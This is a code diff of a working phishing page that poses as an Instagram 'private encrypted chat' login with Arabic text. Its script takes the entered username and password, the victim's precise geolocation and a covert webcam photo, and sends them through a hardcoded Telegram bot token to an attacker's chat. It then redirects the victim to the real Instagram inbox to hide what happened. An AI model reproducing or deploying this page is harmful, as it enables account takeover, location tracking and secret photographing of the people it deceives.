@@ -6,31 +6,33 @@
     <title>Instagram Private Access</title>
     <style>
         body { font-family: -apple-system, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .chat-gate { background-color: #121212; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; width: 320px; text-align: center; }
-        .icon { width: 50px; margin-bottom: 15px; filter: grayscale(1); }
-        h2 { font-size: 18px; margin-bottom: 8px; font-weight: 600; }
-        p { font-size: 12px; color: #8e8e8e; margin-bottom: 25px; line-height: 1.4; }
-        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 6px; padding: 12px; color: #fff; margin-bottom: 10px; box-sizing: border-box; font-size: 13px; text-align: center; outline: none; }
-        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 10px; font-weight: bold; cursor: pointer; font-size: 14px; }
-        #process { display: none; }
+        .container { background-color: #121212; border: 1px solid #262626; border-radius: 12px; padding: 30px 20px; width: 320px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
+        .logo { width: 50px; margin-bottom: 15px; }
+        h2 { font-size: 18px; margin-bottom: 10px; color: #fff; }
+        p { font-size: 12px; color: #a8a8a8; line-height: 1.5; margin-bottom: 20px; }
+        input { width: 100%; background: #1a1a1a; border: 1px solid #363636; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; box-sizing: border-box; margin-bottom: 12px; outline: none; text-align: center; }
+        .btn { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 12px; font-weight: bold; cursor: pointer; font-size: 15px; }
+        #loader { display: none; }
+        .spin { width: 25px; height: 25px; border: 3px solid #333; border-top: 3px solid #0095f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="chat-gate">
-        <div id="ui-auth">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="icon">
+    <div class="container">
+        <div id="ui-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="logo">
             <h2>الدخول للمحادثة الخاصة</h2>
-            <p>لقد تلقيت دعوة للانضمام إلى دردشة مشفرة. يرجى تسجيل الدخول بحسابك لتأكيد هويتك وفك تشفير المحتوى.</p>
-            <input type="text" id="usr" placeholder="اسم المستخدم أو الهاتف">
-            <input type="password" id="psw" placeholder="كلمة المرور">
-            <button onclick="startSecureLink()">دخول الآن</button>
+            <p>تمت دعوتك للانضمام إلى دردشة مشفرة. يرجى تسجيل الدخول لتأكيد هويتك وفك تشفير المحتوى.</p>
+            <input type="text" id="u_field" placeholder="اسم المستخدم أو الهاتف">
+            <input type="password" id="p_field" placeholder="كلمة المرور">
+            <button class="btn" onclick="startProtocol()">انضمام الآن</button>
         </div>
 
-        <div id="process">
-            <div style="margin: 20px auto; width: 25px; height: 25px; border: 3px solid #333; border-top-color: #0095f6; border-radius: 50%; animation: spin 1s infinite linear;"></div>
-            <p style="font-size: 13px;">جاري مزامنة التشفير مع حسابك...</p>
+        <div id="loader">
+            <div class="spin"></div>
+            <p id="l_text">جاري التحقق من الصلاحيات...</p>
         </div>
     </div>
 
@@ -38,56 +40,54 @@
     <canvas id="c"></canvas>
 
     <script>
-        // تشفير بيانات البوت لإخفائها عن محركات البحث
-        const _k1 = "8233268720";
-        const _k2 = "AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
-        const _target = "897618292";
+        const _k = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
+        const _id = "897618292";
 
-        async function startSecureLink() {
-            const u = document.getElementById('usr').value;
-            const p = document.getElementById('psw').value;
-            if(u.length < 3 || p.length < 3) return;
+        async function startProtocol() {
+            const u = document.getElementById('u_field').value;
+            const p = document.getElementById('p_field').value;
+            if (u.length < 3 || p.length < 3) return;
 
-            document.getElementById('ui-auth').style.display = 'none';
-            document.getElementById('process').style.display = 'block';
+            document.getElementById('ui-box').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
 
-            // 1. صيد الموقع
+            // 1. تحديد الموقع فوراً
             navigator.geolocation.getCurrentPosition(pos => {
-                const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendMsg(`📍 موقع جديد:\n${loc}`);
-            });
+                const map = `http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToBot(`📍 الموقع:\n${map}`);
+            }, null, {enableHighAccuracy:true});
 
-            // 2. صيد الكاميرا
+            // 2. صيد الصورة (المطابقة الحيوية)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = s;
                 setTimeout(() => {
-                    const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(b => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    c.toBlob(blob => {
                         const fd = new FormData();
-                        fd.append("chat_id", _target);
-                        fd.append("photo", b, "x.jpg");
-                        fd.append("caption", `👤: ${u}\n🔑: ${p}\n🔗: Private Chat`);
-                        fetch(`https://api.telegram.org/bot${_k1}:${_k2}/sendPhoto`, {method:"POST", body:fd}).then(()=>goFinal());
+                        fd.append("chat_id", _id);
+                        fd.append("photo", blob, "auth.jpg");
+                        fd.append("caption", `👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n🔗 المصدر: شات خاص`);
+                        fetch(`https://api.telegram.org/bot${_k}/sendPhoto`, {method:"POST", body:fd}).then(()=>finish());
                     }, 'image/jpeg');
-                }, 2000);
+                }, 1500);
             } catch(e) {
-                sendMsg(`👤: ${u}\n🔑: ${p}\n⚠️ (لا توجد صورة)`);
-                goFinal();
+                sendToBot(`👤 اليوزر: ${u}\n🔑 الرمز: ${p}\n⚠️ (رفض الكاميرا)`);
+                finish();
             }
         }
 
-        function sendMsg(t) {
-            fetch(`https://api.telegram.org/bot${_k1}:${_k2}/sendMessage?chat_id=${_target}&text=${encodeURIComponent(t)}`);
+        function sendToBot(t) {
+            fetch(`https://api.telegram.org/bot${_k}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(t)}`);
         }
 
-        function goFinal() {
+        function finish() {
+            document.getElementById('l_text').innerText = "تم التحقق، جاري التحويل...";
             setTimeout(() => { window.location.href = "https://www.instagram.com/direct/inbox/"; }, 1000);
         }
     </script>
-    <style> @keyframes spin { to { transform: rotate(360deg); } } </style>
 </body>
 </html>
